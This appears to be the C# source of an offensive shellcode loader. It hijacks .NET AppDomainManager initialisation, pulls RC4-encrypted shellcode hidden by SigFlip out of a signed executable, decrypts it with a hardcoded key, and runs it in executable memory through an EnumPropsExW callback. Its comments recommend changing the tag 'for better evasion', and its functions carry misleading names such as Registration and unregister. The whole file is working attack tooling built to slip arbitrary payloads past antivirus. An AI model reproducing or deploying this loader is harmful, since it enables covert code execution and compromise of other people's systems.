using System;
using System.IO;
using System.EnterpriseServices;
using System.Runtime.InteropServices;

public sealed class Assembly : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {	
		bool res = codebase.Registration();
		
        return;
    }
}

public class codebase 
{
	[DllImport("kernel32")]
	private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
	
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
	   
    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("user32.dll")]
    private static extern IntPtr GetTopWindow(IntPtr hwnd);
    
    // Execution technique from here https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/NativePayload_EnumPropsExW.cs
    [DllImport("user32.dll")]
    private static extern int EnumPropsExW(IntPtr hwnd, IntPtr lpenumfunc, IntPtr lparam);

    public delegate void AsyncCallBack();
    
    // Static tag from SigFlip - Modify in SigFlip and below for better evasion!
    public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
    
    // Read input file
    public static byte[] Read(string filePath)
    {
        using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
        {
            byte[] rawData = new byte[stream.Length];
            stream.Read(rawData, 0, (int)stream.Length);
            stream.Close();

            return rawData;
        }
    }

    // Decryption function from SigFlip
    public static byte[] unregister(byte[] data, string encKey)
    {
        byte[] T = new byte[256];
        byte[] S = new byte[256];
        int keyLen = encKey.Length;
        int dataLen = data.Length;
        byte[] result = new byte[dataLen];
        byte tmp;
        int j = 0, t = 0, i = 0;

        for (i = 0; i < 256; i++)
        {
            S[i] = Convert.ToByte(i);
            T[i] = Convert.ToByte(encKey[i % keyLen]);
        }

        for (i = 0; i < 256; i++)
        {
            j = (j + S[i] + T[i]) % 256;
            tmp = S[j];
            S[j] = S[i];
            S[i] = tmp;
        }
        j = 0;
        for (int x = 0; x < dataLen; x++)
        {
            i = (i + 1) % 256;
            j = (j + S[i]) % 256;

            tmp = S[j];
            S[j] = S[i];
            S[i] = tmp;

            t = (S[i] + S[j]) % 256;

            result[x] = Convert.ToByte(data[x] ^ S[t]);
        }

        return result;
    }

    public static int scanPattern(byte[] _peBytes, byte[] pattern)
    {
        int _max = _peBytes.Length - pattern.Length + 1;
        int j;
        for (int i = 0; i < _max; i++) {
            if (_peBytes[i] != pattern[0]) continue;
            for (j = pattern.Length - 1; j >= 1 && _peBytes[i + j] == pattern[j]; j--) ;
            if (j == 0) return i;
        }
        return -1;
    }

    // Shellcode Runner
    public static void registered(byte[] input)
    {
        // Allocate space
        IntPtr alloc = VirtualAlloc(IntPtr.Zero, input.Length, 0x1000 | 0x2000, 0x40);
        if (alloc == IntPtr.Zero)
        {
            return;
        }

        // Copy input
        Marshal.Copy(input, 0, alloc, input.Length);

        // Execute
        IntPtr p2 = GetTopWindow(IntPtr.Zero);

        System.Threading.Thread.Sleep(5555);

        int ok = EnumPropsExW(p2, alloc, IntPtr.Zero);
    }

    public static void WriteFile(string filename, byte[] rawData)
    {
        FileStream fs = new FileStream(filename, FileMode.OpenOrCreate);
        fs.Write(rawData, 0, rawData.Length);
        fs.Close();
    }

    // Execute
	public static bool Registration()
	{
        System.Windows.Forms.MessageBox.Show("Executing Shellcode!");
	
        // This should be your binary you wanna inject into . 
        byte[] _peBlob = Read(".\\myTest.exe");

        int _dataOffset = scanPattern(_peBlob, _tag);

        Stream stream = new MemoryStream(_peBlob);
        long pos = stream.Seek(_dataOffset + _tag.Length, SeekOrigin.Begin);

        byte[] regfile = new byte[_peBlob.Length+4 - (pos + _tag.Length)];
        //byte[] regfile = new byte[_peBlob.Length+2 - (pos + _tag.Length)];

        stream.Read(regfile, 0, (_peBlob.Length+4) - ((int)pos + _tag.Length));
        //stream.Read(regfile, 0, (_peBlob.Length+2) - ((int)pos + _tag.Length));

        // Decryption routine - Replace the below hardcoded key with your password
        byte[] assemblyFile = unregister(regfile, "KeyzKeyz");

        // Output decrypted shellcode to file for comparison to original shellcode
        WriteFile(".\\debug-DecryptedScode.txt", assemblyFile);
        	
        stream.Close();

        // Cleanup
        //Array.Clear(shellcode, 0, shellcode.Length);
        //_dataOffset = 0;
        //pos = 0;

        // Execute the decrypted Shellcode 
        registered(assemblyFile);

        return true;
	} 
}
